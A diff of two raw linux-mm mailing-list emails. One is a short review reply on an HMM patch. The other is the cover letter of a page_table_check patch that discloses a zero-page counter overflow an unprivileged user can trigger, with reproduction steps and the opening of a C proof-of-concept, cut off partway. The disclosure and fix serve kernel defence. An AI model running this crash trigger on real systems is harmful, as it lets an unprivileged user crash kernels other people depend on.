@@ -4,145 +4,111 @@ X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 Received: from kanga.kvack.org (kanga.kvack.org [205.233.56.17])
 	(using TLSv1 with cipher DHE-RSA-AES256-SHA (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id 8BDF1C4451C
-	for <linux-mm@archiver.kernel.org>; Tue, 21 Jul 2026 15:43:11 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id 5F961C4451C
+	for <linux-mm@archiver.kernel.org>; Tue, 21 Jul 2026 15:56:50 +0000 (UTC)
 Received: by kanga.kvack.org (Postfix)
-	id D565E6B009D; Tue, 21 Jul 2026 11:43:09 -0400 (EDT)
+	id 0045A6B0093; Tue, 21 Jul 2026 11:56:49 -0400 (EDT)
 Received: by kanga.kvack.org (Postfix, from userid 40)
-	id D2EAC6B009E; Tue, 21 Jul 2026 11:43:09 -0400 (EDT)
+	id F1E316B0095; Tue, 21 Jul 2026 11:56:48 -0400 (EDT)
 X-Delivered-To: int-list-linux-mm@kvack.org
 Received: by kanga.kvack.org (Postfix, from userid 63042)
-	id C44296B009F; Tue, 21 Jul 2026 11:43:09 -0400 (EDT)
+	id E0D316B0096; Tue, 21 Jul 2026 11:56:48 -0400 (EDT)
 X-Delivered-To: linux-mm@kvack.org
-Received: from relay.hostedemail.com (smtprelay0017.hostedemail.com [216.40.44.17])
-	by kanga.kvack.org (Postfix) with ESMTP id 8CBAA6B009D
-	for <linux-mm@kvack.org>; Tue, 21 Jul 2026 11:43:09 -0400 (EDT)
+Received: from relay.hostedemail.com (smtprelay0010.hostedemail.com [216.40.44.10])
+	by kanga.kvack.org (Postfix) with ESMTP id AC1FC6B0093
+	for <linux-mm@kvack.org>; Tue, 21 Jul 2026 11:56:48 -0400 (EDT)
 Received: from smtpin07.hostedemail.com (lb01a-stub [10.200.18.249])
-	by unirelay01.hostedemail.com (Postfix) with ESMTP id 090021C0101
-	for <linux-mm@kvack.org>; Tue, 21 Jul 2026 15:43:09 +0000 (UTC)
-X-FDA: 85013202498.07.4FB9954
-Received: from sea.source.kernel.org (sea.source.kernel.org [172.234.252.31])
-	by imf18.hostedemail.com (Postfix) with ESMTP id 35D3E1C000E
-	for <linux-mm@kvack.org>; Tue, 21 Jul 2026 15:43:07 +0000 (UTC)
-Authentication-Results: imf18.hostedemail.com;
-	dkim=pass header.d=kernel.org header.s=k20260515 header.b=i46hQ7WB;
-	spf=pass (imf18.hostedemail.com: domain of david@kernel.org designates 172.234.252.31 as permitted sender) smtp.mailfrom=david@kernel.org;
-	dmarc=pass (policy=quarantine) header.from=kernel.org
+	by unirelay10.hostedemail.com (Postfix) with ESMTP id 36E35C01F7
+	for <linux-mm@kvack.org>; Tue, 21 Jul 2026 15:56:48 +0000 (UTC)
+X-FDA: 85013236896.07.D20753D
+Received: from mail-pl1-f182.google.com (mail-pl1-f182.google.com [209.85.214.182])
+	by imf01.hostedemail.com (Postfix) with ESMTP id 8621640013
+	for <linux-mm@kvack.org>; Tue, 21 Jul 2026 15:56:46 +0000 (UTC)
+Authentication-Results: imf01.hostedemail.com;
+	dkim=pass header.d=gmail.com header.s=20251104 header.b=TphnWG6h;
+	spf=pass (imf01.hostedemail.com: domain of enjou1224z@gmail.com designates 209.85.214.182 as permitted sender) smtp.mailfrom=enjou1224z@gmail.com;
+	dmarc=pass (policy=none) header.from=gmail.com
 ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
-	s=arc-20220608; t=1784648587;
+	s=arc-20220608; t=1784649406;
 	h=from:from:sender:reply-to:subject:subject:date:date:
 	 message-id:message-id:to:to:cc:cc:mime-version:mime-version:
-	 content-type:content-type:
-	 content-transfer-encoding:content-transfer-encoding:
-	 in-reply-to:in-reply-to:references:references:dkim-signature;
-	bh=K8km+ZQgkLUVNh5jQNamAtWyAYxH8WzuI6GZYyhCw5A=;
-	b=lrIHZedMP2mVMV4SIEMW6BCj519iVbORaCASsZ6JtbLdtOSrJVZP8oQuvr2cI9tFydN4XM
-	rMl+RD9J0JqofoDZbWpEuDxNHlm7lDzZjwYIR415hEZtyVbDInc66OAxrYmH16crYVBFFV
-	3jUb+/kCd2zsnmjNrB9/FnZ9Lx6I9/8=
-ARC-Authentication-Results: i=1;
-	imf18.hostedemail.com;
-	dkim=pass header.d=kernel.org header.s=k20260515 header.b=i46hQ7WB;
-	spf=pass (imf18.hostedemail.com: domain of david@kernel.org designates 172.234.252.31 as permitted sender) smtp.mailfrom=david@kernel.org;
-	dmarc=pass (policy=quarantine) header.from=kernel.org
+	 content-type:content-transfer-encoding:content-transfer-encoding:
+	 in-reply-to:references:dkim-signature;
+	bh=XmIj32erS1jwigWOXNUBRAhRVATS+2+Si6E1lz8XJNc=;
+	b=4b9dJFje1cKIumx9z0Z2vwQAtPiysMrLZIGMz3/r46knDWMReRdf7Fbxw4To4+ynINwFx4
+	qw5bOhRW4Z1KXl87Rh8XTEZlqcRJ8juyracrWdU9Y7Dx5FiJLXNIvcvYkE5rUhk5ga7yMl
+	biZ6/bjb1knbJI1f+bqjinNIva6RXlo=
 ARC-Seal: i=1; a=rsa-sha256; d=hostedemail.com; s=arc-20220608; cv=none;
-	t=1784648587;
-	b=7nvY1O4vAGM/pWO8kMA45W1VKUjNwjHoy+R6PBwUDLGXGLHOqaKtBj5mR+DXEFtaz3zG5K
-	1b9dpGGFr2vPIqEvkgsD4VOkXDUEDco7fElTTtHbCed3YEnwupWIkylEwq+86xDl8al4wV
-	7EbGhvawZtdJfdZp3HR6ogT0zGwYkSc=
-Received: from smtp.kernel.org (quasi.space.kernel.org [100.103.45.18])
-	by sea.source.kernel.org (Postfix) with ESMTP id 75B014361B;
-	Tue, 21 Jul 2026 15:43:06 +0000 (UTC)
-Received: by smtp.kernel.org (Postfix) with ESMTPSA id C47751F000E9;
-	Tue, 21 Jul 2026 15:42:55 +0000 (UTC)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=kernel.org;
-	s=k20260515; t=1784648586;
-	bh=K8km+ZQgkLUVNh5jQNamAtWyAYxH8WzuI6GZYyhCw5A=;
-	h=Date:Subject:To:Cc:References:From:In-Reply-To;
-	b=i46hQ7WBWTSjsJoo0+aveeWDcCrbR28cpcdsOhYe47u8VnVADMzUCzgKDgO1zrrFL
-	 RvX8M8IyZbwW6+2/ZFYKqtdyCdD7Bu7yegasMnOCMW6PitAN9yJ5HbJKOCXUKS/Jo8
-	 L6csKx3I2nudveiiZxOEhTUX4Y72B+kVDuKRxQiwFJVlPNIgxTlo2pnnik+08H/vAB
-	 wOZJ3QkGLxPrbYexz4Z2lPFM52xsYgt5WeZbuKkkIur+qqoEMW+gxo5TgYo20cxjeF
-	 8dDfaslPMlAeyIafDK2s4i66yRQGvgmYRh1ZHlvhjlF4y8buBZXjFVNi7m2f+SrPSV
-	 Ve0R4XiL7aGhw==
-Message-ID: <3ed2043b-88e7-4a86-9efb-fe788191e8e8@kernel.org>
-Date: Tue, 21 Jul 2026 17:42:53 +0200
+	t=1784649406;
+	b=iK835RpQx2pjrgXin30Ymhyx7pTpu2wAM6Hxm06idYV0D21SX1se1GEGhNQyawPLjGFSc1
+	nqAIs2rkjs9Rcbg8145TH4+z2eXGnt1rRlzhLXwiXd9AufHBVH1Gj11AqdVekDwfnNrCyp
+	PUwWA5X0cgoY9YtJFQxfQtcmLq2D7k0=
+ARC-Authentication-Results: i=1;
+	imf01.hostedemail.com;
+	dkim=pass header.d=gmail.com header.s=20251104 header.b=TphnWG6h;
+	spf=pass (imf01.hostedemail.com: domain of enjou1224z@gmail.com designates 209.85.214.182 as permitted sender) smtp.mailfrom=enjou1224z@gmail.com;
+	dmarc=pass (policy=none) header.from=gmail.com
+Received: by mail-pl1-f182.google.com with SMTP id d9443c01a7336-2cf52d15d88so32557805ad.2
+        for <linux-mm@kvack.org>; Tue, 21 Jul 2026 08:56:46 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20251104; t=1784649405; x=1785254205; darn=kvack.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=XmIj32erS1jwigWOXNUBRAhRVATS+2+Si6E1lz8XJNc=;
+        b=TphnWG6hJpr0MY94O8aTChKJio6jWn8BAaFqR71eKc/a8+qEyjOeYbLmgURe3Or5hJ
+         VL9XdNRznsUbdDatX50y1jJLPPzTW5jt4oD/asXCmwKxq/Iyjh2JwZKM6NU2qbqt4pNb
+         TkWprbLKrvGJV67HiOQ94FXxpMXFSSzN9/kH9jj03+tfJpFR0sybl9/9iWOxdxD+wmRn
+         yrJTVjjfLNVwhCUlTwh9SXp/pai412i2oeweOVmCGpWNRzxnmpz2fNCPN6R8uB66BO2j
+         3+pYPhKH4iUrLK6SPzUqhusJlVckxY4l2Hz95TCvGE98p5HDxIpFYN9jhi4J7Sbouj28
+         rlUA==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20251104; t=1784649405; x=1785254205;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=XmIj32erS1jwigWOXNUBRAhRVATS+2+Si6E1lz8XJNc=;
+        b=O6Ag7evxnofWrj3Wrwo6AcgJJto6oWvijRPqJs0P+aQ0xVCjNt6OSMJVHhu1PTSndp
+         DLrETfnF5yY84LcJdnmyvLMvcTWAxJeNVpoEHeQZRPBy3jMz7nbTaZwNw47CZ9LvOJXQ
+         EX/ZuOaNBlNfyTFEamNK/dZs9p9dvc/EHe1rXk4Rt2kFhLMQei6c+RbV8IhYFdib7Muy
+         K0VKfh0VXJW84bUG2wzF628seEx7rp/mEYteuBYszWAKe00rUHgX2pZCw5Xj/lYH2PRB
+         /r1rR7uARwdwkPTKipf6TQsFlXk1Ft1+5C/IWv1LyvClC+yFoHwFfRm4wj/ondjBm5xq
+         hhZA==
+X-Gm-Message-State: AOJu0YyY9imXdWPqNO5xVWChvC8ZZyXNx+coMIiEj/6hIcIcw8Gfoucq
+	cTIzFbGBEB5AQTYdDRG7+39Ui1+UsOzKqL+9hN9ZwYAnDPROPpjXHQOcmwG8e/ra
+X-Gm-Gg: AR+sD11AtLI8jkMResNA7RI3Lw/3Tq/ge9bOcuDNTAL3rN5zEmvZynrKJ4QRV7+biF9
+	duz4JCChu/t12T8shhoE2IKFIlaXmnGgNLpABK/B0YlrrVQ7XC7NXTI3uCwNu4nw+7/HKeoJXbF
+	ifO98SHACxP1SGTMjZh7Pt0Q2IovUNTJ/VcS+ciOr3kAFdXm4DP1YbK8fX4PWrkrrwb+bPuPehm
+	FMhwfOxlgCpcRqKyZKMbDlSdc8wiEHuzjDzvafTHckYxcQbUvRYJelOduQyCX5ugXv9/qfel0b/
+	tHNpuocmEfXULy6sloNUJekozdHpMXOjCJ5yqGeYNezn+VJJUNkWCiPw6ERtWW6tYyyaxZg2PsE
+	gdptpfT1E0Fy5WlgLFTWCwh9MfXUqEsVsgZ7ShzOUzrMMH57JjwZpK4VT10JqV0gcuXLgYnjUcJ
+	G8i8Gmbrwv7HDKejLnnA==
+X-Received: by 2002:a17:903:4b50:b0:2c9:c952:6e9 with SMTP id d9443c01a7336-2cf3483689emr204724045ad.2.1784649404876;
+        Tue, 21 Jul 2026 08:56:44 -0700 (PDT)
+Received: from enjou-Legion-Y7000P-2019 ([144.48.80.242])
+        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2cf345111d5sm78494075ad.37.2026.07.21.08.56.41
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Tue, 21 Jul 2026 08:56:44 -0700 (PDT)
+From: Ren Wei <enjou1224z@gmail.com>
+To: linux-mm@kvack.org
+Cc: pasha.tatashin@soleen.com,
+	akpm@linux-foundation.org,
+	vega@nebusec.ai,
+	roxy520tt@gmail.com,
+	enjou1224z@gmail.com
+Subject: [PATCH v2 0/1] mm/page_table_check: skip zero pages
+Date: Tue, 21 Jul 2026 23:56:37 +0800
+Message-ID: <cover.1784645969.git.roxy520tt@gmail.com>
+X-Mailer: git-send-email 2.51.0
 MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
-Subject: Re: [PATCH v9 2/8] mm/hmm: add hmm_range_fault_unlocked_timeout() for
- mmap lock-drop support
-To: Stanislav Kinsburskii <skinsburskii@gmail.com>, airlied@gmail.com,
- akhilesh@ee.iitb.ac.in, akpm@linux-foundation.org, corbet@lwn.net,
- dakr@kernel.org, decui@microsoft.com, haiyangz@microsoft.com, jgg@ziepe.ca,
- kees@kernel.org, kys@microsoft.com, leon@kernel.org, liam@infradead.org,
- lizhi.hou@amd.com, ljs@kernel.org, longli@microsoft.com, lyude@redhat.com,
- maarten.lankhorst@linux.intel.com, mamin506@gmail.com, mhocko@suse.com,
- mripard@kernel.org, nouveau@lists.freedesktop.org, ogabbay@kernel.org,
- oleg@redhat.com, rppt@kernel.org, shuah@kernel.org, simona@ffwll.ch,
- skhan@linuxfoundation.org, surenb@google.com, tzimmermann@suse.de,
- vbabka@kernel.org, wei.liu@kernel.org
-Cc: dri-devel@lists.freedesktop.org, intel-xe@lists.freedesktop.org,
- linux-mm@kvack.org, linux-doc@vger.kernel.org, linux-hyperv@vger.kernel.org,
- linux-kernel@vger.kernel.org, linux-kselftest@vger.kernel.org,
- linux-rdma@vger.kernel.org
-References: <178413903133.1155966.3904063656020521607.stgit@skinsburskii>
- <178413936536.1155966.8918127042760531802.stgit@skinsburskii>
-From: "David Hildenbrand (Arm)" <david@kernel.org>
-Content-Language: en-US
-Autocrypt: addr=david@kernel.org; keydata=
- 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
- qIws/H2t
-In-Reply-To: <178413936536.1155966.8918127042760531802.stgit@skinsburskii>
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: 7bit
+Content-Transfer-Encoding: 8bit
+X-Rspamd-Server: rspam10
+X-Rspamd-Queue-Id: 8621640013
+X-Stat-Signature: x1bgitnjfr5wnoyiooioyswytusr4ipq
 X-Rspam-User: 
-X-Rspamd-Server: rspam08
-X-Rspamd-Queue-Id: 35D3E1C000E
-X-Stat-Signature: jpfds84cwpru7encb7c5pf51ir4af1ej
-X-HE-Tag: 1784648587-394448
-X-HE-Meta: U2FsdGVkX195fn5dyXnkZpjLC/nkZx5zYvrzgnMZxxkfKD8BSgKSGnpaKHfhgU8qCTt1KmGcANwUtP6+ug+2wUXKJO/6Hmyj/F29NnLcD9iVuh582/VQrQYt4cjBz1/bR8Fv0yCfL9q0OzLtH/8DlViSW9tAKca1PzjCxEJ9jkfpNaNOBLVyrN/bO92bhjCCXFMesYoP8AbQBTDTehqNfKkSnA6K4zTky55cQiC2nLWmvich+yIbv5ZfMq2Gz1f8eco5HsqRzgio4hmSkCTw8cQpLg2ViI9myv8cZPfozgCkzPAgRLTstREYl7CwzzScSDXslThmRAQo32wU8z8/Ifz3SBTdctd4tHx4N4eutAEo+R62ChVkxhSikm82AvAEnQ8t5xq21+h33pgGEkEoqC0UUp7oUq1m1UhAtXc4AuusEQqMkix2giVARUat/R1rR48n8/+kC5xGfnf0aZrLFDu7T6jPFtJPARR1BV1OqZqvzV/ASQmTKSDKahpmcwUxSfx3+nWmZn3ZfyxPLiGO1AkkKotUVGp0zEG+mRscAGQzjYHyyA1lbBcwlSgTzwOwBf57fJKB/clE1GTIUjs46bXkQr7lm71K8SwxrAEMIvdc8aI+zo38alp4GTcLXBgTLFWu1RNPykWvEMFp2jANXf6NtwQMkggGhMi1R1Uw9buVTlf1H0xYOVctnYv+gaVKNZjk6SL/0XksXK8hIjfXmXQ0QLVGn5RCcFY5h0Kb8DLZaAia3sVP4OheuVdnntDM2NzvxA0O91g/zywma4FPsLIsQ8QGm3xbFH786F1wHTslpRffdHysIIbjkST7VuDYj0FjNrLdA8RNSQm5MiLjHpru4Udr0GOC8TKVaFe0T+hlbulU+CJKgYT1dhFWCmXlKtvFa1k6q+BVwtgklUgYw+fN6vUTsJhKqqV+nNKlOBuw2L+ieEIrNHDOHFS3TZE/WQF6c3dJmVaoAeK0/rL
- ke/LLkWU
- 3yeTo+c66HsGo6d6hOdMRaj00ZaPjP0zbvI8ZM5EZJ9V4+pPtxSZK/qQWhsbhRtRKxEcx4lCaYy6SAvmZV+IYQUM3HkdY+X2P4ThlBhPI0BmVI6PNh/cGur+H4uo+qbL8HPJ76DEDz4LzBcaRO0rFWhJQSvfDSNVHQGYTpuX/n6+Ow3IOcWUc5aALel4dpDXUf5dNRcEbbyGckFaO+WmU5gm3jQRsZ2jZwDMSHtcXMwlG9JrvT0JJx27DY1c5R+ovzAGjXRjkgm8aeQZNr0/fefXrNzGFIKHe4+aQAqkfMLCvOJRAqlYOr1xAqQ==
+X-HE-Tag: 1784649406-94218
+X-HE-Meta: U2FsdGVkX1/YObcxBYTFdhsaIe91k2vdikoYgCpIgOUBddACgGIfYekIHqTRkbkNHSMNTkAmY/ArBx8c/FqSKDVrLlNJRK7ftd2JYvq5i403EU2bGPiIC+Rv8HYCaofd48jKmqfrlanTvEiXd1nUwqjtrkKyxYy070iLw1WWvW21YDvCN5saiDWox5FyryM1mdYpTFnBSXzzrvWEjsB04ejClPzubYJnHpL8ZJbDwPvAtc9nn3ozK5tr7CK0gFjAtGYXt6oyv3pNwFP82hps66TRQxlAkREmCjDe+dyTono6+Bj/yvfxEBxiosbQA1kvMPZTK+y8bcRxLQ/J3emfHgGUbOobK8WTj+hfhrf2GGR5DPoYXxpu1FToY+9s1KlI3G/w3HD6Yv5dhAw/iScwChWiI5mFJuz1ENZQ7Ee59JMMjMl2JDrNwm4Oi1vyDMrRmEScSuRqf5b1uVzf4FzZ9pBpKqeq5piVNMyQ1eviXJDe2v1hAWK3Zi123R1NgqSpHltswQ78MBKJqJabzxqe08T3hp6AKKrXPZT6uE5wU2f2YE5z4Xd8JEXt6WcwnUfobsvNco9StkNYPi3zhKo/gd1sUWUPf6Ti3Q1hG+yeBoQo/rHl0z9g5CNmlk2d+opVyqe9h9wdRV592jfhXpZAFOd2DM5j1CG9MfL6g3u9wJnojOW/2LMPbfybAqh1sf+KLBkbSTa8hzoRmPlU8J44cFJ0fJJCzp8au3WlsbBfql/2Ln+S8IEPSOK0dMq1KyNhkwnkSMTVUIyar30Lpf9y/Veb+/1zmbNLiwGlGQtaDLwm+eWN1CXzQT7y+QrVBnDo5LkKIx0A35bS6SKMEOvYCmUGHLPamdknm96LrubgdfTHwxu0rqVja+nabgC+Jm4bVU0oaCFITpXmsX+UlVKatj6HcT0KFheZE4e8Irrk6B6Lk3LGWM49khYoVjEWkrcPIwb5RGoi3u4hRbJc8dY
+ uV+Dj1Nn
+ bAcRptm21RG1ngavqgDdF5qJPD0K+n4uNAs4AKu/I9y+4YrJ2lvMHcNEgoKnSr9HB7qzZep95fIJYbp5T/O6pbnqBNh9jTtKq/vlo8x/Wo1DiMD4gj3AxWhG9uHiBkdFQxoJ6gu94REzE95nrzOcp80dCK9Ho9E8nErX5midh/b2Pbg6nYPuTbyR07uMPefA/5jg7WtcUl11dHAuf80bIlZ5xq0fT0BN9PyZ3iBgdbBZKmGJVk1ybfhWPfA3RRbVEy+FlLb0bPx5B7rzEtaTPFeMoU43NPBvyGBJhaKiWgIhqZ0UMwaW72MnCtD0nYvY8+YD9R39O7CZX6/a09bRXOuRHGxdf06oK+JDKHVUmuYGCmzz1DPGjcXAjWDDJhJuVMANY2/RceqTBnJ1ZsH6OpBY9yCX2DnbN6hWq/dwuEYIWziI9/+tacZ2BGc3kWfUhYJWPXTT+QbQJXpk=
 Sender: owner-linux-mm@kvack.org
 Precedence: bulk
 X-Loop: owner-majordomo@kvack.org
@@ -150,35 +116,319 @@ List-ID: <linux-mm.kvack.org>
 List-Subscribe: <mailto:majordomo@kvack.org>
 List-Unsubscribe: <mailto:majordomo@kvack.org>
 
-On 7/15/26 20:16, Stanislav Kinsburskii wrote:
-> hmm_range_fault() requires the caller to hold the mmap read lock for the
-> duration of the call. This is incompatible with mappings whose fault
-> handler may release the mmap lock, notably userfaultfd-managed regions,
-> where handle_mm_fault() can return VM_FAULT_RETRY or VM_FAULT_COMPLETED
-> after dropping the lock. Drivers that need to populate device page tables
-> for such mappings have no way to do so today.
-> 
-> Add hmm_range_fault_unlocked_timeout() for callers that do not need to hold
-> mmap_lock across any work outside the HMM fault itself. The helper takes
-> mmap_read_lock_killable() internally, calls the common HMM fault
-> implementation, and releases the lock before returning if it is still held.
-> The timeout is specified in jiffies; passing 0 retries indefinitely, while
-> a non-zero timeout makes the helper return -EBUSY when the retry budget
-> expires.
+From: Zhiling Zou <roxy520tt@gmail.com>
 
-The timeout does not / cannot affect how long we might be stuck without the mmap
-lock in e.g., the userfaultfd handler. And also not how long it would take to
-actually grab the mmap lock.
+Hi Linux kernel maintainers,
 
-That's expected with the timeout, right?
+We found and validated an issue in mm/page_table_check.c. The bug is
+reachable by a non-root user directly, without user or network
+namespaces.
 
-[...]
+We've built the changed object, and the fix should not affect normal
+page_table_check functionality because it only treats permanent zero
+pages as a special case while leaving the existing ordinary-page checks
+unchanged.
 
+We will provide detailed information about the bug in this email, along
+with a PoC to trigger it.
 
-Nothing else jumped at me.
+---- details below ----
+
+Bug details:
+
+page_table_check_set() and page_table_check_clear() account pages based
+on whether PageAnon() is set. The shared zero page is a special page,
+not an ordinary file-backed page, but the current code still counts its
+read-only anonymous mappings in file_map_count.
+
+An unprivileged process can fault enough private anonymous read-only
+memory to repeatedly map the shared zero page until file_map_count wraps
+negative, after which page_table_check_set() or page_table_check_clear()
+trips the existing BUG_ON().
+
+This fix skips zero pages in page_table_check accounting. Those pages do
+not need the anonymous-versus-file conflict checks which
+page_table_check performs for ordinary pages, and this keeps the counter
+size and page_ext layout unchanged.
+
+Reproducer:
+
+    gcc -O2 -Wall -Wextra -static -o poc poc.c
+    ./poc
+
+The PoC defaults to 16 workers and 513 GB of read-only anonymous virtual
+space per worker. We run the PoC in a 16 vCPU, 24 GB RAM x86 QEMU
+environment with panic_on_warn=0.
+------BEGIN poc.c------
+
+#define _GNU_SOURCE
+
+#include <errno.h>
+#include <signal.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/mman.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <unistd.h>
+
+#ifndef MADV_POPULATE_READ
+#define MADV_POPULATE_READ 22
+#endif
+
+static unsigned long long env_ull(const char *name, unsigned long long def)
+{
+	const char *s = getenv(name);
+	char *end = NULL;
+	unsigned long long v;
+
+	if (!s || !*s)
+		return def;
+
+	errno = 0;
+	v = strtoull(s, &end, 0);
+	if (errno || !end || *end) {
+		fprintf(stderr, "invalid %s=%s\n", name, s);
+		exit(2);
+	}
+	return v;
+}
+
+static void worker(int sync_fd, unsigned long long gigabytes,
+		   unsigned long long base_addr_tb)
+{
+	const unsigned long long len = gigabytes << 30;
+	const uintptr_t hint = (uintptr_t)(base_addr_tb << 40);
+	void *addr;
+	char c;
+
+	if (read(sync_fd, &c, 1) < 0) {
+		perror("read(sync_fd)");
+		_exit(1);
+	}
+	close(sync_fd);
+
+	addr = mmap((void *)hint, len, PROT_READ,
+		    MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE |
+			    MAP_FIXED_NOREPLACE,
+		    -1, 0);
+	if (addr == MAP_FAILED && errno == EEXIST) {
+		addr = mmap(NULL, len, PROT_READ,
+			    MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE, -1,
+			    0);
+	}
+	if (addr == MAP_FAILED) {
